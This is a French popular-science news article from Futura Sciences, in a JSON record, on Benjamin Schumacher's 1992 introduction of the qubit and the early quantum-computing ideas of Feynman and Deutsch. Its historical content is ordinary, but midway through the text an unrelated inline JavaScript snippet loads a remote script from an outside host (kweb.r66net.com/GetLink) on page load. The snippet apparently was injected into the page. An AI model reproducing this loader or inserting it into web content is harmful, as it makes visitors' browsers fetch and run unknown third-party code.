{"title": "Les qubits des ordinateurs quantiques naissaient il y a 25 ans", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "12/07/2017", "content": "Pendant l'été 1992, il y a donc 25 ans, alors que le concept d'ordinateur quantique venait tout juste d'être introduit en science et que la théorie du calcul quantique en était encore à ses débuts, un jeune physicien allait introduire une idée et un nom qui allaient faire fortune : le qubit. Ce qu'il faut retenir L’information et les opérations que l’on peut lui faire subir pour la traiter ont des bases mathématiques, mais aussi physiques et c’est pour cela qu’il a fallu développer un concept approprié de bit d’information pour explorer la théorie des ordinateurs quantiques. Pendant l’été 1992, le physicien Benjamin Schumacher a donc développé un tel concept qu’il a appelé qubit. Interview : en quoi un ordinateur quantique est-il différent ?                       Le monde quantique est fascinant : à cette échelle, par exemple, les objets peuvent se trouver simultanément dans plusieurs états. Exploitant ce principe, un ordinateur quantique aurait des possibilités bien plus vastes qu’un modèle classique. Dans le cadre de sa série de vidéos Questions d’experts, sur la physique et l’astrophysique, l’éditeur De Boeck a interrogé Claude Aslangul, professeur à l’UPMC, afin qu'il nous explique le fonctionnement de cette étrange machine.                                        Au début des années 1990, on est encore au temps de ce que les historiens des sciences et des technologies du futur appelleront peut-être l'ère de la paléo-informatique quantique. La décennie précédente, des physiciens comme  Richard Feynman  et David Deutsch avaient commencé à développer le concept d' ordinateur quantique . Dans le cas de  Feynman , il s'agissait d'abord et surtout d'utiliser des systèmes quantiques comme simulateurs d'autres systèmes quantiques. La simulation de ces derniers sur des ordinateurs classiques était difficile, voire impossible, du moins à son époque, étant donné les coûts en  volume , et donc en temps de calcul. Mais Feynman, avec d'autres, considérait déjà clairement des  portes  logiques quantiques qui permettaient de faire des opérations similaires à celles des ordinateurs. David Deutsch , de son côté, développait parallèlement aux idées de Feynman les concepts d'algorithmes quantiques et de machine de Turing universelle quantique, concepts qui permettent véritablement de parler d'ordinateurs quantiques. Tenant de l'interprétation des mondes multiples de la  mécanique quantique , celle que l'on doit à  Hugh Everett  et qui suppose l'existence de mondes parallèles, Deutsch avait lui aussi compris que les ordinateurs quantiques étaient susceptibles de battre les ordinateurs classiques en mobilisant les lois de la mécanique quantique pour faire, en quelque sorte, directement des calculs en parallèle considérablement plus rapides. Un extrait du séminaire donné en 1992 par Benjamain Schumacher dans lequel il introduisait pour la première fois le concept de qubit. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». © Science News Toutefois, personne n'avait encore vraiment transposé la notion de bit d'information classique qui est pourtant un ingrédient essentiel de l'informatique, aussi bien du point de vue de la théorie du calcul sur ordinateur que de la théorie de l'information développée par  Claude Shannon  et intervient également dans le fonctionnement et les  applications  des ordinateurs. C'est à un élève de  John Wheeler  (à qui l'on doit des noms de concepts percutants qui vont faire fortune comme  trou noir  et trou de vers) que l'on doit la première formulation du concept de bit d'information quantique dont il a également trouvé le nom : le  qubit .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le qubit, le bit quantique d’information Cet élève s'appelle  Benjamin Schumacher  et c'est lors d'un colloque sur la théorie  physique  du calcul à Dallas en 1992 qu'il a introduit le concept de qubit dont il a eu l'idée quelques mois auparavant en discutant avec son collègue William Wootters. Il s'agissait, pour Schumacher, de donner une base claire à la façon dont des ordinateurs quantiques pouvaient coder et stocker des bits d'informations et, donc, de pouvoir préciser dans le cadre quantique certains des concepts que l'on utilisait pour décrire le traitement de l'information dans le cas des ordinateurs classiques, ce qui n'était pas utilisable tel quel avec des ordinateurs quantiques. Ainsi, l'état « 0 » ou « 1 » que l'on pouvait stocker sous forme d'état de magnétisation d'une mémoire d'ordinateur pouvait devenir en quelque sorte une superposition quantique de « 0 » et de « 1 » lorsque l'on voulait coder une information dans l'état de superposition du  spin  d'un  électron  dans lequel « 0 » et « 1 » représentent classiquement une orientation vers le haut ou vers le bas de l'axe de rotation de la toupie quantique qu'est un électron. Au début, les idées de Schumacher ne rencontrèrent pas un grand écho mais quelques années plus tard, cela a commencé à changer. Et le temps passant, le domaine de la théorie de l'information quantique avec des qubits n'a cessé de monter en puissance jusqu'à interroger même les bases de la  gravitation quantique  ainsi que celles de la physique de la vie et de la  conscience . ", "theme": "sciences"}